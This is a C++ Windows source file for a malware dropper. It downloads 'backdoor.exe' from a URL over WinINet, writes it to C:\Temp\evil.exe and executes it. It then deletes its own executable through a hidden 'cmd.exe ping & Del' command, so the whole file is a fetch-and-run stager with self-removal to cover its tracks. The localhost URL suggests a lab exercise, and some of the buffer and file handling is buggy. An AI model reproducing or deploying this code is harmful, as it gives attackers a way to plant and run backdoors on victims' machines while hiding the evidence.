#include <Windows.h>
#include <iostream>
#include <wininet.h>
#include <strsafe.h>

#define SELF_REMOVE_STRING TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")

char *getEvil(const char *url) {
    HINTERNET hSession = InternetOpen((LPCSTR) "Mozilla/5.0", 
                                      INTERNET_OPEN_TYPE_DIRECT, 
                                      NULL, 
                                      NULL, 
                                      0);
    HINTERNET hHttpFile = InternetOpenUrl(hSession, 
                                          (LPCSTR) url, 
                                          0, 
                                          0, 
                                          0, 
                                          0);
    if (!hHttpFile) {
        std::cout << "Error opening URL." << std::endl;
        return nullptr;
    }

    DWORD dwFileSize = 0;

    // Determine the file size
    if (!InternetQueryDataAvailable(hHttpFile, &dwFileSize, 0, 0)) {
        std::cout << "Error determining file size." << std::endl;
        InternetCloseHandle(hHttpFile);
        return nullptr;
    }

    // Allocate memory for the buffer
    char *buffer = new char[dwFileSize + 1];

    DWORD dwBytesRead;
    do {
        // Read the file data
        ZeroMemory(buffer, sizeof(buffer));
        InternetReadFile(hHttpFile, (LPVOID)buffer, dwFileSize, &dwBytesRead);

        // Write the file data to disk
        HANDLE hFile = CreateFile("C:\\Temp\\evil.exe", 
                                  GENERIC_READ | GENERIC_WRITE, 
                                  FILE_SHARE_READ, 
                                  NULL, 
                                  OPEN_ALWAYS, 
                                  FILE_ATTRIBUTE_NORMAL, 
                                  NULL);

        if (!hFile) {
            std::cout << "Error creating file." << std::endl;
            delete[] buffer;
            InternetCloseHandle(hHttpFile);
            return nullptr;
        }

        DWORD dwBytesWritten;
        WriteFile(hFile, &buffer[0], dwBytesRead, &dwBytesWritten, NULL);
        CloseHandle(hFile);

    } while (dwBytesRead);

    InternetCloseHandle(hHttpFile);
    InternetCloseHandle(hSession);

    return buffer;
}

// Idk how this works, but it does :D
// This function deletes the current executable
// Source: https://stackoverflow.com/questions/3457040/how-to-write-a-program-in-c-such-that-it-will-delete-itself-after-execution
void yeet() {
    TCHAR szModuleName[MAX_PATH];
    TCHAR szCmd[2 * MAX_PATH];
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};

    GetModuleFileName(NULL, szModuleName, MAX_PATH);

    StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);

    CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}

int main() {
    const char *url = "http://localhost:8081/backdoor.exe";
    char *evil = getEvil(url);

    // Execute the downloaded file
    if (evil) {
        STARTUPINFO si = {0};
        PROCESS_INFORMATION pi = {0};

        CreateProcess("C:\\Temp\\evil.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
        yeet();
    }

    return 0;
}
